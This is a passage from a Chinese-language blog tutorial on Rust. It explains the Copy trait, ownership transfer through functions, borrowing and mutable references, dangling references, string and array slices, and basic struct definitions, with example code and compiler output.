<code>s1</code> 的深拷贝。通过 <code>clone</code> 方法进行操作，能够提醒开发者注意这样的操作是可能影响性能的，要三思而后行。</p><h4 id="仅存在栈上的数据：复制"><a href="#仅存在栈上的数据：复制" class="headerlink" title="仅存在栈上的数据：复制"></a>仅存在栈上的数据：复制</h4><p>需要注意的是，那些只存储在栈上的数据是没有深拷贝和浅拷贝的区分的，拷贝它们不会导致各种问题。比如下面的代码：</p><pre><code class="rust">fn main() &#123;    let x = 5;    let y = x;    println!(&quot;x = &#123;&#125;, y = &#123;&#125;&quot;, x, y);&#125;</code></pre><p>大小确定的类型并不需要 <code>clone</code> 这样的方法来进行复制，因为它们在栈上，而不是堆上。对这样大小确定的栈数据的复制是很高效的。</p><p>Rust 有一个特殊的注解（annotation）叫做 <code>Copy</code> trait，我们可以把它放在像整数（integer）这样存储在栈中的类型上。如果一个类型实现了 <code>Copy</code> trait，那么这个类型的一个旧的变量在赋给其他变量后仍然可用（就像上面的那段代码中的 <code>x</code>，赋值给 <code>y</code> 后仍然可用）。如果一个类型或者这个类型的任何部分实现了 <code>Drop</code> trait，Rust 就会不允许使用 <code>Copy</code> trait 注解该类型。</p><p>如果某个类型的变量离开作用域时需要进行某些特殊处理，我们对该变量使用 <code>Copy</code> 注解会发生编译错误。</p><blockquote><p>关于 Trait，这是一种 Rust 中的概念，将在后文中进行介绍，暂时可以忽略。需要了解如何将 <code>Copy</code> 注解添加到类型中以实现 trait，请参阅 <a href="https://doc.rust-lang.org/book/appendix-03-derivable-traits.html">Derivable  Traits</a>。</p></blockquote><p>那么什么类型实现了 <code>Copy</code> trait？可以查看给定类型的文档来确定，但作为一个通用的规则，任何一组简单的<strong>标量值</strong>都可以实现 <code>Copy</code>，并且任何不需要内存分配（allocation，指前文所提到的在堆中分配）和某些形式资源的类型都可以实现 <code>Copy</code>。以下是一些实现 <code>Copy</code> 的类型：</p><ul><li>所有整数类型，例如 <code>u32</code>；</li><li>布尔类型 <code>bool</code>；</li><li>所有浮点类型，例如 <code>f64</code>；</li><li>字符类型，<code>char</code>；</li><li>Tuple，且其中只包含实现了 <code>Copy</code> 的类型。例如，<code>(i32, i32)</code> 实现了 <code>Copy</code>，但 <code>(i32, String)</code> 没有，因为 <code>String</code> 不符合条件。</li></ul><h4 id="所有权和函数"><a href="#所有权和函数" class="headerlink" title="所有权和函数"></a>所有权和函数</h4><p>将值传递给函数类似于为变量赋值。和变量赋值一样，将变量传递给函数会出现移动（move）或复制（copy）。看下面的一段代码：</p><pre><code class="rust">fn main() &#123;    let s = String::from(&quot;hello&quot;);  // s 进入作用域    takes_ownership(s);             // s 的值被移动（move）到了 takes_ownership 函数中，                                    // 因此它不再可用了    let x = 5;                      // x 进入作用域    makes_copy(x);                  // x 被传入 makes_copy 函数,                                    // 但是因为 i32 类型实现了 Copy,                                    // 因此在接下来还能够被使用&#125; // x 离开作用域, 接着 s 离开作用域. 但是由于 s 的所有权被拿走了，因此不会有什么特别的操作fn takes_ownership(some_string: String) &#123; // some_string 进入作用域    println!(&quot;&#123;&#125;&quot;, some_string);&#125; // some_string 离开作用域，接着 drop() 被调用以回收内存fn makes_copy(some_integer: i32) &#123; // some_integer 进入作用域    println!(&quot;&#123;&#125;&quot;, some_integer);&#125; // some_integer 离开作用域，没有什么特别的操作</code></pre><p>如果调用 <code>takes_ownership()</code> 之后尝试使用 <code>s</code>，Rust 会抛出一个编译错误。这些静态检查能够使我们免于出错。</p><p>到这里可以总结出：一个在堆中分配的变量，它的所有权可能会进行转移，但它要求被唯一的所有者掌控，由最终的所有者去处理它的内存释放。需要注意的是，变量的所有权是指它所占堆空间的所有权，只在栈上分配的变量没有所有权机制。深拷贝占用了新的堆空间，因此有独立的所有权。</p><h4 id="返回值和作用域"><a href="#返回值和作用域" class="headerlink" title="返回值和作用域"></a>返回值和作用域</h4><p>返回值也可以转移所有权：</p><pre><code class="rust">fn main() &#123;    let s1 = gives_ownership();         // s1 获得了 gives_ownership() 返回值的所有权    let s2 = String::from(&quot;hello&quot;);    let s3 = takes_and_gives_back(s2);  // s2 的所有权交给了 takes_and_gives_back() 的参数，                                        // 但又通过这个函数的返回值传给了 s3&#125; // s3、s1 经由 drop() 回收fn gives_ownership() -&gt; String &#123;    let some_string = String::from(&quot;yours&quot;);    some_string // some_string 堆中部分的所有权将被交给调用它的变量&#125;fn takes_and_gives_back(a_string: String) -&gt; String &#123;     a_string&#125;</code></pre><p>所有变量的所有权都遵循相同的规则：把值直接赋给另一个变量会产生移动（move）。当包含了堆数据的变量离开作用域时，该值将通过 <code>drop()</code> 清除，除非该数据的所有权已经归另一个变量所有。</p><p>测试下面的一段代码：</p><pre><code class="rust">fn main() &#123;    let s = String::from(&quot;hello&quot;);        takes_ownership(s);        println!(&quot;&#123;&#125;&quot;, s.len())&#125;fn takes_ownership(s: String) &#123;    println!(&quot;&#123;&#125;&quot;, s.len());&#125;</code></pre><p>意料之中地发生了编译错误，那么如何重新取得一个变量的所有权呢？可以通过下面的方式解决：</p><pre><code class="rust">fn main() &#123;    let s1 = String::from(&quot;hello&quot;);    let (s1, len) = calculate_length(s1);    println!(&quot;The length of &#39;&#123;&#125;&#39; is &#123;&#125;.&quot;, s1, len);&#125;fn calculate_length(s: String) -&gt; (String, usize) &#123;    let length = s.len();    (s, length)&#125;</code></pre><p>上面的代码借 Tuple 实现了多返回值，并使用了 Rust 的 <em>shadowing</em> 机制重新得到了所有权并交给了同名变量 <code>s1</code>，可以感觉到这个过程还是太麻烦了。幸运的是，Rust 提供了<strong>引用</strong>（<em>references</em>）机制来解决这个问题。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本节对于 Rust 的所有权机制进行了一个初步的介绍，Rust 用所有权机制让栈中的变量与其在堆中分配的数据一对一地关联起来（个人感觉这就像一条牵狗绳），在变量赋值的过程中，原变量会失去堆中数据的所有权，转交给被赋值的变量。通过这种方式，Rust 硬性地解决了常见的各种内存分配问题。由于所有权的唯一化，在变量作用域结束时就可以将其自动回收，不会出现忘记回收以及重复回收的问题。</p><h3 id="引用和借用"><a href="#引用和借用" class="headerlink" title="引用和借用"></a>引用和借用</h3><p>上一节末尾提到的<strong>引用</strong>（<em>references</em>）机制，可以在不移动所有权的前提下访问一个变量的堆中数据。下面是由上一节末尾处代码改写的一个示例：</p><pre><code class="rust">fn main() &#123;    let s1 = String::from(&quot;hello&quot;);    let len = calculate_length(&amp;s1);    println!(&quot;The length of &#39;&#123;&#125;&#39; is &#123;&#125;.&quot;, s1, len);&#125;fn calculate_length(s: &amp;String) -&gt; usize &#123;    s.len()&#125;</code></pre><p>注意这段代码中的新语法 <code>&amp;</code>（<code>&amp;s1</code> 和 <code>&amp;String</code>），使用这个操作符能够引用一个变量，从而在没有所有权的情况下操作这个变量的堆中数据。其底层的情况如下图所示：</p><p><img src="/learn-rust/trpl04-05.svg" class="lazyload" data-srcset="/learn-rust/trpl04-05.svg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="&amp;String s pointing at String s1"></p><blockquote><p>注意：使用 <code>&amp;</code> 进行引用的相反操作是取消引用，可以通过取消引用操作符 <code>*</code> 来完成，这些内容暂时不进行讨论。</p></blockquote><p>上述代码中，<code>calculate_length</code> 函数中的 <code>s</code> 是一个 <code>&amp;String</code> 类型，即一个 <code>String</code> 的引用类型，这表明它不具有某个值的所有权，在离开作用域时不会对其调用 <code>drop()</code> 操作，并且这个函数也不需要归还任何值的所有权。</p><p>我们把创建引用的行为称为<strong>借用</strong>（<em>borrowing</em>），这个名字包含了“有借有还”的原则。</p><blockquote><p>reference 作名词，borrow 作动词，而在中文语境下不怎么需要纠结它们的差别。</p></blockquote><p>看到这里很自然地会有一个问题：借用的值有什么不同？我们能不能对“借”来的值进行写操作呢？尝试编译运行下面的代码：</p><pre><code class="rust">fn main() &#123;    let s = String::from(&quot;hello&quot;);    change(&amp;s);&#125;fn change(some_string: &amp;String) &#123;    some_string.push_str(&quot;, world&quot;);&#125;</code></pre><pre><code class="shell">$ cargo run   Compiling ownership v0.1.0error[E0596]: cannot borrow `*some_string` as mutable, as it is behind a `&amp;` reference  --&gt; src\main.rs:42:5   |41 | fn change(some_string: &amp;String) &#123;   |                        ------- help: consider changing this to be a mutable reference: `&amp;mut String`42 |     some_string.push_str(&quot;, world&quot;);   |     ^^^^^^^^^^^ `some_string` is a `&amp;` reference, so the data it refers to cannot be borrowed as mutableFor more information about this error, try `rustc --explain E0596`.error: could not compile `ownership` due to previous error</code></pre><p>答案是不能，从编译错误的信息中我们能够看到，由 <code>&amp;</code> 借用来的 <code>String</code> 引用，默认是不可变的。</p><h4 id="可变引用"><a href="#可变引用" class="headerlink" title="可变引用"></a>可变引用</h4><p>我们可以用下面的方式解决引用不可变的问题：</p><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;); // mut    change(&amp;mut s); // mut&#125;fn change(some_string: &amp;mut String) &#123; // mut    some_string.push_str(&quot;, world&quot;);&#125;</code></pre><p>上面的代码成功编译并运行了。需要注意的是所有权的拥有者（<code>s</code>）同样也要被改为可变的。</p><p>然而有个很大的问题是只能借用一次可变，下面的代码就会编译出错：</p><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;);    let r1 = &amp;mut s;    let r2 = &amp;mut s;    println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);&#125;</code></pre><p>不能多次借用 <code>s</code> 作为可变参数。可能有人会想：既然不能进行多次可变借用，那多次不可变借用行不行？</p><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;); // 由于 mut 属性没有被用到，编译时会警告但不会报错    let r1 = &amp;s;    let r2 = &amp;s;    println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);&#125;</code></pre><p>这么写就可以了，但要是一个可变借用一个不可变借用呢？尝试下面的情况：</p><pre><code class="rust">let r1 = &amp;mut s;let r2 = &amp;s;println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);</code></pre><p>这次编译报错，提示 <code>cannot borrow `s` as immutable because it is also borrowed as mutable</code>，意思是已经以可变的方式借用过了，不能再以不可变的方式借用了。再给它颠倒过来试一下：</p><pre><code class="rust">let r1 = &amp;s;let r2 = &amp;mut s;println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);</code></pre><p>这次仍然报错，提示 <code>cannot borrow `s` as mutable because it is also borrowed as immutable</code>，同样不行，报错信息也反过来了。</p><p>第一个可变借用在 <code>r1</code> 中并且必须持续到它在 <code>println!</code> 中使用为止，要想再借用就必须在这之后（无论是可变还是不可变），所以下面的代码都是有效的：</p><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;);    let r1 = &amp;mut s;    println!(&quot;&#123;&#125;&quot;, r1);        let r2 = &amp;mut s;    println!(&quot;&#123;&#125;&quot;, r2);&#125;</code></pre><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;);    let r1 = &amp;mut s;    println!(&quot;&#123;&#125;&quot;, r1);        let r2 = &amp;s;    println!(&quot;&#123;&#125;&quot;, r2);&#125;</code></pre><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;);    let r1 = &amp;s;    println!(&quot;&#123;&#125;&quot;, r1);        let r2 = &amp;mut s;    println!(&quot;&#123;&#125;&quot;, r2);&#125;</code></pre><p>综上所述，防止对同一数据进行多个可变引用的限制很严格，从而非常安全可控。不过虽然可以通过上面的代码来实现值的变动，但这实在是有些麻烦。</p><blockquote><p>这也是很多新的 Rust 人士（Rustaceans，Rust 开发者的自称）想要努力解决的问题，因为大多数语言都可以让开发者随时进行变动。</p></blockquote><p>有这个限制的好处是 Rust 可以在编译时防止出现<strong>数据竞争</strong>（<em>data races</em>）。数据竞争类似于竞争条件（<em>race condition</em>），当出现以下三种行为时就会发生：</p><ul><li>两个或多个指针同时访问相同的数据；</li><li>至少有一个指针用于写入数据；</li><li>没有用于同步数据访问的机制。</li></ul><p>数据竞争会导致未定义的行为，并且当你尝试在运行时追踪它们，可能难以诊断和修复。Rust 防止了这个问题的发生，因为带有数据竞争的代码编译直接不能通过。</p><p>既然上述的限制都是在同一个作用域之中的，那么使用新的作用域也就不会有问题了：</p><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;);    &#123;        let r1 = &amp;mut s;    &#125; // r1 已经离开作用域了，因此可以在后面再次引用 s    let r2 = &amp;mut s;&#125;</code></pre><p>需要注意的是，引用的作用范围是从它<strong>被引用的地方开始</strong>，直到<strong>最后一次被使用</strong>。因此下面的代码不会出现编译错误，因为没有被使用，它们的作用范围没有交叉，根本不会引起冲突。</p><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;);    let r1 = &amp;mut s; // r1 引用作用范围结束    let r2 = &amp;mut s; // r2 引用作用范围结束    let r3 = &amp;mut s; // r3 引用作用范围结束&#125;</code></pre><blockquote><p>无需特别记忆这个规则，实际上很简单，就是看<strong>引用到最后一次使用</strong>的作用范围有没有重叠。没有出现引用的作用范围重叠的代码就是预期之中的。另外，编译器在某变量作用范围结束之前判断其<strong>不再使用引用</strong>的能力被称为非词法生命周期（Non-Lexical Lifetimes，简称 NLL），参照 <a href="https://doc.rust-lang.org/edition-guide/rust-2018/ownership-and-lifetimes/non-lexical-lifetimes.html">The Edition Guide</a>。</p></blockquote><p>如果不了解所有权机制，可能会写出很多错误的代码，但是 Rust 在这方面做的最贴心的地方就是编译器会尽早（在编译时而不是在运行时）指出潜在的错误，并准确地展示问题所在。这样就省去了很多花在在运行时 debug 的时间。大概率不会产生“为什么这个地方和我预期的结果不一样”的疑问。</p><h4 id="悬挂引用"><a href="#悬挂引用" class="headerlink" title="悬挂引用"></a>悬挂引用</h4><blockquote><p>Dangling References，也可以译为悬空引用。</p></blockquote><p>在带有指针的编程语言中，如果释放了一块内存但是没有删除指向该内存的指针，那这个指针就变成了悬挂指针。该指针可能指向的是一块未分配的内存，也可能指向了<strong>已经被分配给了其他数据</strong>的内存，这是很严重的错误。相比之下，在 Rust 中，编译器能保证引用永远不会是悬挂引用：如果你持有一些数据（这段话中的数据指的都是堆中的值）的引用，编译器将确保在引用的数据处理完之前数据不会离开作用域。</p><pre><code class="rust">fn main() &#123;    let reference_to_nothing = dangle();&#125;fn dangle() -&gt; &amp;String &#123;    let s = String::from(&quot;hello&quot;);    &amp;s&#125;</code></pre><p>上面的这段代码中，<code>dangle</code> 函数返回的是 <code>String</code> 的引用，而非转让它的所有权，因此当这个函数返回时，<code>reference_to_nothing</code> 引用的那块堆内存已经被 <code>drop</code> 了。下面是编译器报错：</p><pre><code class="shell">$ cargo run   Compiling ownership v0.1.0error[E0106]: missing lifetime specifier  --&gt; src\main.rs:45:16   |45 | fn dangle() -&gt; &amp;String &#123;   |                ^ expected named lifetime parameter   |   = help: this function&#39;s return type contains a borrowed value, but there is no value for it to be borrowed fromhelp: consider using the `&#39;static` lifetime   |45 | fn dangle() -&gt; &amp;&#39;static String &#123;   |                ^^^^^^^^For more information about this error, try `rustc --explain E0106`.error: could not compile `ownership` due to previous error</code></pre><p>这段错误涉及到我们的知识盲区了，这个 <em>lifetime</em> 是什么？我暂时也不知道，但这不重要，看其中的一段错误信息：</p><p><em>this function’s return type contains a borrowed value, but there is no value for it to be borrowed from.</em></p><p>这句话的意思是这个函数返回了<strong>包含一个借用来的值</strong>的类型，但是没有它能借用的值。借用来的值实际上就是指引用值，也就是说引用的对象已经不存在了。这很好理解，<code>dangle</code> 函数结束时把 <code>s</code> 给 <code>drop</code> 了，这个操作是先于函数返回值的，因此返回不了任何东西。那怎么解决呢？很简单，就照没学引用的那时候办，直接转让所有权就行了：</p><pre><code class="rust">fn no_dangle() -&gt; String &#123;    let s = String::from(&quot;hello&quot;);    s&#125;</code></pre><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>让我们最后回顾一下本节关于引用的内容：</p><ul><li>在任何时候，可以在<strong>任意数量但作用范围不重叠的可变引用、可变引用和不可变引用的组合</strong>或**任意数量的不可变引用。</li><li>引用必须始终有效。</li></ul><blockquote><p>要注意这个或啊，作用范围内生效的可变引用只能有一个，和不可变引用不能同时都有，不可变引用的话数量不限。</p></blockquote><h3 id="切片类型"><a href="#切片类型" class="headerlink" title="切片类型"></a>切片类型</h3><blockquote><p>Slice，很常见的类型，如果只是停留在它的表象上可以理解为可变的数组。</p></blockquote><p>切片是一种没有所有权的类型，它用于引用一个<strong>连续的元素序列</strong>的一部分。</p><h4 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h4><p>字符串切片（string slice）引用一个字符串的一部分，它的类型是 <code>&amp;str</code>，例如下面的代码：</p><pre><code class="rust">fn main() &#123;    let s = String::from(&quot;hello world&quot;);    let hello = &amp;s[0..5];    let world = &amp;s[6..11];        println!(&quot;&#123;&#125; &#123;&#125;&quot;, hello, world); // hello world&#125;</code></pre><p>其中，<code>hello</code> 和 <code>world</code> 各引用了 <code>s</code> 的一部分，它们通过下标来指定范围（这和其他编程语言没什么差别），使用了我们已经学过的 <code>&amp;</code> 来引用。</p><p>如果把 <code>&amp;s[0..5]</code> 改为 <code>s[0..5]</code> 会怎么样呢？可以尝试一下，这时候编译器会报 <code>doesn&#39;t have a size known at compile-time</code> 错误，意思是这个值的大小在编译期间未知，这很合理。</p><p>下图展示了 <code>s</code> 和 <code>world</code> 两个变量的实际结构：</p><p><img src="/learn-rust/trpl04-06.svg" class="lazyload" data-srcset="/learn-rust/trpl04-06.svg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="world containing a pointer to the byte at index 6 of String s and a length 5"></p><p>Rust 的范围语法支持很灵活的表示方式，比如省略开始下标（<code>[..n]</code>）和省略结束下标（<code>[n..]</code>）来实现从头开始和到尾结束，这也是比较常见的用法。</p><p>需要注意的一点是，<code>String</code> 采用 UTF-8 编码，当字符串截取到非法的位置，是会引起运行时错误的。下面的代码展示了正确的情况：</p><pre><code class="rust">fn main() &#123;    let s = String::from(&quot;你好世界&quot;);    let len = s.len();    println!(&quot;&#123;&#125;&quot;, len); // 12    let hello = &amp;s[..6];    let world = &amp;s[6..];    let whole = &amp;s[..]; // 等同于 `&amp;s[0..s.len()]`    println!(&quot;&#123;&#125; &#123;&#125;&quot;, hello, world); // 你好 世界    println!(&quot;&#123;&#125;&quot;, whole); // 你好世界&#125;</code></pre><p>可以看到，四个中文字符总共占用了 12 bytes，根据 UTF-8 编码方式，它们每个字符占用的是 3 bytes，我们尝试在字符的中间位置截取字符串，把 <code>&amp;s[..6]</code> 改为 <code>&amp;s[..2]</code>：</p><pre><code class="rust">let hello = &amp;s[..2];</code></pre><pre><code class="shell">$ cargo run   Compiling ownership v0.1.0    Finished dev [unoptimized + debuginfo] target(s) in 0.33s     Running `\path_to\ownership\target\debug\ownership.exe`12thread &#39;main&#39; panicked at &#39;byte index 2 is not a char boundary; it is inside &#39;你&#39; (bytes 0..3) of `你好世界`&#39;, src\main.rs:58:18note: run with `RUST_BACKTRACE=1` environment variable to display a backtraceerror: process didn&#39;t exit successfully: `\path_to\ownership\target\debug\ownership.exe` (exit code: 101)</code></pre><p>注意这次产生的是运行时错误，和以往的编译错误不同，它不会影响出错位置之前的代码执行，因此 12 这个结果能够正常输出。错误的原因也非常简单，刚刚已经提到过了，字符串截取的范围非法（不在字符边界）。这个问题需要留意，以免写出错误的程序。</p><blockquote><p>在之后的章节有对 Rust 关于字符串 UTF-8 编码的详细介绍。</p></blockquote><p>下面再看一段程序：</p><pre><code class="rust">fn first_word(s: &amp;String) -&gt; &amp;str &#123;    let bytes = s.as_bytes();    for (i, &amp;item) in bytes.iter().enumerate() &#123;        if item == b&#39; &#39; &#123;            return &amp;s[0..i];        &#125;    &#125;    &amp;s[..]&#125;fn main() &#123;    let mut s = String::from(&quot;hello world&quot;);    let word = first_word(&amp;s);    s.clear(); // error!    println!(&quot;the first word is: &#123;&#125;&quot;, word);&#125;</code></pre><p>其中，<code>first_word</code> 函数的作用是返回一个字符串的第一个单词切片，使用了迭代特性，遇到空格就把前面的这部分字符串返回。<code>first_word</code> 函数暂时不是我们的重点，重点是 <code>main</code> 函数部分，它抛出了一个编译错误 <code>cannot borrow `s` as mutable because it is also borrowed as immutable</code>，这个错误之前已经见过了。<code>clear</code> 方法是一个用于清空字符串内容的方法，显然它应当是以可变引用的方式借用的原字符串，而 <code>first_world</code> 函数是以不可变引用的方式借用的，并且它在 <code>clear</code> 被调用后仍在被使用，因此二者会出现冲突。</p><h4 id="字符串字面量是切片"><a href="#字符串字面量是切片" class="headerlink" title="字符串字面量是切片"></a>字符串字面量是切片</h4><p>回忆一下之前提到的字符串字面量：</p><pre><code class="rust">let s = &quot;Hello, world!&quot;;</code></pre><p><code>s</code> 的类型实际上是 <code>&amp;str</code>，一个字符串切片，不过它指向的是栈空间中特定位置的二进制内容（指这段字符串）。这同时解释了为什么字符串字面量是不可变的。</p><h4 id="字符串切片作为参数"><a href="#字符串切片作为参数" class="headerlink" title="字符串切片作为参数"></a>字符串切片作为参数</h4><p>之前见到的处理字符串的函数通常是这样的：</p><pre><code class="rust">fn first_word(s: &amp;String) -&gt; &amp;str &#123;&#125;</code></pre><p>而更有经验的程序员会使用下面的写法：</p><pre><code class="rust">fn first_word(s: &amp;str) -&gt; &amp;str &#123;&#125;</code></pre><p>这有什么好处呢？实际上，第二种写法既能接收字符串引用，也能接收字符串切片，而第一种写法只能接收字符串引用：</p><pre><code class="rust">fn first_word(s: &amp;str) -&gt; &amp;str &#123;    // 省略&#125;fn main() &#123;    // 下面的所有用法都是正确的    let my_string = String::from(&quot;hello world&quot;);    let word = first_word(&amp;my_string[0..6]);    let word = first_word(&amp;my_string[..]);    let word = first_word(&amp;my_string); // ?    let my_string_literal = &quot;hello world&quot;;    let word = first_word(&amp;my_string_literal[0..6]);    let word = first_word(&amp;my_string_literal[..]);    let word = first_word(my_string_literal);&#125;</code></pre><p>其他的地方都没什么好说的，需要特别注意的是上面问号注释的一行，实参是一个 <code>&amp;String</code> 类型，而 <code>first_world</code> 的形参是一个 <code>&amp;str</code> 类型，这说明 Rust 存在<strong>隐式类型转换</strong>，具体的实现未来再介绍。</p><h4 id="其他切片"><a href="#其他切片" class="headerlink" title="其他切片"></a>其他切片</h4><p>字符串切片是基于字符串类型的，除了字符串切片还有很多切片类型，比如 <code>&amp;[i32]</code> 切片：</p><pre><code class="rust">fn main() &#123;    let arr = [1, 2, 3, 4, 5];        let slice = &amp;arr[1..3];        for e in slice &#123;        println!(&quot;&#123;&#125;&quot;, e);    &#125;        assert_eq!(slice, &amp;[2, 3]); // 断言&#125;// 2// 3</code></pre><p>这种切片的原理和实现和字符串切片相同，不再赘述。类似其他语言中的断言，Rust 的相等断言在其参数不相等时会报错，因此 <code>slice</code> 变量的内容和 <code>&amp;[2, 3]</code> 是完全相等的。</p><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>所有权、借用和切片的概念确保了 Rust 程序在编译期间的内存安全。Rust 让你可以像使用其他系统编程语言（理解为主要用于开发操作系统的语言）一样控制内存的使用。但是让数据所有者在离开作用域时自动清理该数据，意味着开发者不必编写和调试额外的代码就能够得到这种控制。</p><p>所有权机制会影响 Rust 许多其他部分的工作方式，因此在剩下的部分中还会讨论相关的某些概念。</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>结构体（<em>struct</em>，也即 <em>structure</em>）是一种自定义数据类型，可用于命名和打包一组有意义的多个相关值。如果你熟悉 OO（面向对象）语言，结构体就像对象的数据属性。在本章中，我们将比较元组和结构体，并演示如何定义和实例化结构体。我们将讨论如何定义关联函数（associated functions），特别是被称为方法（<em>method</em>）的关联函数类型，以指定与结构体类型关联的行为。结构体和枚举（enum）是在程序域中创建新类型的构建块，以充分利用 Rust 的编译期类型检查。</p><h3 id="定义和实例化结构体"><a href="#定义和实例化结构体" class="headerlink" title="定义和实例化结构体"></a>定义和实例化结构体</h3><p>结构体和元组类似，能够组合多个不同的类型，但它会对其中的每个字段进行命名，因此其中的字段可以通过名称进行操作。下面是一个结构体的定义和实例化示例：</p><pre><code class="rust">// 定义一个结构体struct User &#123;    active: bool,    username: String,    email: String,    sign_in_count: u64,&#125;fn main() &#123;    // 实例化一个结构体给 `user1`    let user1 = User &#123;        email: String::from(&quot;someone@example.com&quot;),        username: String::from(&quot;someusername123&quot;),        active: true,        sign_in_count: 1,    &#125;;    println!(&quot;&#123;&#125;&quot;, user1.email); // someone@example.com    println!(&quot;&#123;&#125;&quot;, user1.username); // someusername123    println!(&quot;&#123;&#125;&quot;, user1.active); // true    println!(&quot;&#123;&#125;&quot;, user1.sign_in_count); // 1&#125;</code></pre><p>和 Go 中的结构体类似，Rust 结构体实例化时将各个字段的值初始化为指定的内容。如果要修改结构体的一个或多个字段，同样可以使用 <code>mut</code> 定义：</p><pre><code class="rust">fn main() &#123;    let mut user1 = User &#123;        email: String::from(&quot;someone@example.com&quot;),        username: String::from(&quot;someusername123&quot;),        active: true,        sign_in_count: 1,    &#125;;    user1.email = String::from(&quot;anotheremail@example.com&quot;);        println!(&quot;&#123;&#125;&quot;, user1.email); // anotheremail@example.com&#125;</code></pre><p>需要注意的是，可变的结构体实例其每一个字段都是可变的，不允许为字段单独设置可变属性。下面的函数 <code>build_user</code> 可以返回一个 <code>User</code> 结构体：</p><pre><code class="rust">fn build_user(email: String, username: String) -&gt; User &#123;    User &#123;        email: email,        username: username,        active: true,        sign_in_count: 1,    &#125;&#125;fn main() &#123;    let user1 = build_user(        String::from(&quot;someone@example.com&quot;),        String::from(&quot;someusername123&quot;),    );&#125;</code></pre><p>可以通过将参数名设置为和结构体字段<strong>同名</strong>来简化结构体字段初始化操作：</p><pre><code class="rust">fn build_user(email: String, username: String) -&gt; User &#123;    User &#123;        email, // 等同于 `email: email`        username, // 等同于 `username: username`        active: true,        sign_in_count: 1,    &#125;&#125;</code></pre><p>有时候需要修改一个结构体实例的部分字段，用于初始化另一个新的结构体，下面的代码是原始的写法：</p><pre><code class="rust">let user1 = User &#123;    email: String::from(&quot;someone@example.com&quot;),    username: String::from(&quot;someusername123&quot;),    active: true,    sign_in_count: 1,&#125;;let user2 = User &#123;    active: user1.active,    username: user1.username,    email: String::from(&quot;another@example.com&quot;),    sign_in_count: user1.sign_in_count,&#125;;</code></pre><p>使用结构体更新语法可以简化这个操作：</p><pre><code class="rust">let user2 = User &#123;    email: String::from(&quot;another@example.com&quot;), // 修改 `email` 字段    ..user1 // 从 `user1` 中获取剩余的各字段值&#125;;</code></pre><p><strong>需要特别注意，<code>..user1</code> 必须放在结构体初始化语句的末尾。</strong></p><p>另外，把 <code>user1</code> 中的字段值给 <code>user2</code> 等同于使用 <code>=</code> 进行赋值的操作，涉及到所有权的移动，需要参照前文的所有权机制进行讨论。因此，<code>user2</code> 通过结构体更新获取 <code>user1</code> 的字段后，<code>user1</code> 中的字段就不再可用了。</p><pre><code class="rust">fn main() &#123;    let user1 = User &#123;        email: String::from(&quot;someone@example.com&quot;),        username: String::from(&quot;someusername123&quot;),        active: true,        sign_in_count: 1,    &#125;;    let user2 = User &#123;        email: String::from(&quot;another@example.com&quot;),        ..user1    &#125;;    println!(&quot;&#123;&#125;&quot;, user1.email); // 所有权未移动，不出错    println!(&quot;&#123;&#125;&quot;, user1.username); // 所有权已移动，出错    println!(&quot;&#123;&#125;&quot;, user1.active); // 栈数据，不出错    println!(&quot;&#123;&#125;&quot;, user1.sign_in_count); // 栈数据，不出错&#125;</code></pre><h3 id="元组结构体"><a href="#元组结构体" class="headerlink" title="元组结构体"></a>元组结构体</h3><p>Rust 支持定义一种类似于元组的结构体，叫做元组结构体（<em>tuple structs</em>）。元组结构体首先是结构体，拥有结构体的命名特性，但是其内部的字段是只有类型而没有名字的。元组结构体适用于定义可复用的元组类型。定义元组结构体的示例如下：</p><pre><code class="rust">struct Color(i32, i32, i32);struct Point(i32, i32, i32);let black = Color(0, 0, 0);let origin = Point(0, 0, 0);</code></pre><p>虽然 <code>Color</code> 和 <code>Point</code> 包含的数据类型完全相同，但是它们并不是同一类型，因此 <code>black</code> 和 <code>origin</code> 是不同类型的两个变量。同样的，不同名的结构体都是不同的类型。</p><h3 id="没有任何字段的单元式结构体"><a href="#没有任何字段的单元式结构体" class="headerlink" title="没有任何字段的单元式结构体"></a>没有任何字段的单元式结构体</h3><p>Rust 支持定义没有任何字段的结构体，这种结构体被称为单元式结构体（<em>unit-like structs</em>）因为它很类似于 <code>()</code>。</p>]]></content>
    
    
